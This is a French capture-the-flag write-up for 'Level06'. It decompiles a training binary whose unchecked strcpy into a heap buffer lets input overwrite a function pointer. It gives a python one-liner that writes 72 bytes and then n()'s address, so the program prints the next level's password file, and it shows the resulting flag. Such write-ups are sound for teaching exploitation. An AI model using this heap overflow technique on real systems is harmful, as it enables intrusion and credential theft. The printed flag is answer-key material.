# Rapport CTF - [Level06]

### Observation :
En arrivant sur le level6 on trouve un executable nommé level6.\
Quand nous essayons de le lancer avec un argument le programme repond `Nope`. \
Regardons donc avec gdb ou un decompilateur.

### Explication de Code :
En lancant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (08048454) --------------------------------------------------------
int n()
{
  return system("/bin/cat /home/user/level7/.pass");
}

//----- (08048468) --------------------------------------------------------
int m()
{
  return puts("Nope");
}

//----- (0804847C) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int (**v4)(void); // [esp+18h] [ebp-8h]
  char *v5; // [esp+1Ch] [ebp-4h]

  v5 = (char *)malloc(0x40u);
  v4 = (int (**)(void))malloc(4u);
  *v4 = m;
  strcpy(v5, argv[1]);
  return (*v4)();
}
```
On peux voir une fonction `n()` qui permet de cat le mot de passe du prochain level
Le but est donc d'arriver a jump sur  la fonction `n()`. \
On peux voir aussi que nous avons 2 mallocs et un `strcpy()` (pas de `n` donc pas proteger).

### Solution :
Nous devons donc arriver a ecrire sur le pointeur de v4 pour pouvoir jump sur la fonction `n()`. \
Pour se faire on vas overflow le premier malloc pour pouvoir ecrire sur *v4. \
On ecrit donc 72 octets random puis l'adresse de `n()` en inverser.

On fait la commande suivante pour obtenir le flag :
```sh
./level6 $(python -c "print ('a' * 72 + '\x08\x04\x84\x54'[::-1])")
```

### Resultat :
```sh
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
